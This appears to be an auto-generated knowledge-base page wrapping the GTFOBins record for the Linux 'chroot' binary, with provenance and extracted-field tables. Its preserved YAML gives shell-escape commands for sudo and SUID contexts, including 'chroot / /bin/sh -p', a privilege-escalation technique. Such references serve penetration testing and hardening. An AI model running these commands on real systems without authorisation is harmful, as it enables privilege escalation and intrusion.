---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# chroot

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `chroot` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/chroot` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [chroot](../../tools/linux/chroot.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | chroot |
| name | chroot |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/chroot/ |

## Preserved Source Material

```yaml
_body: ''
_name: chroot
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/chroot
functions:
  shell:
  - code: chroot /
    contexts:
      sudo: null
      suid:
        code: chroot / /bin/sh -p
        shell: false
```
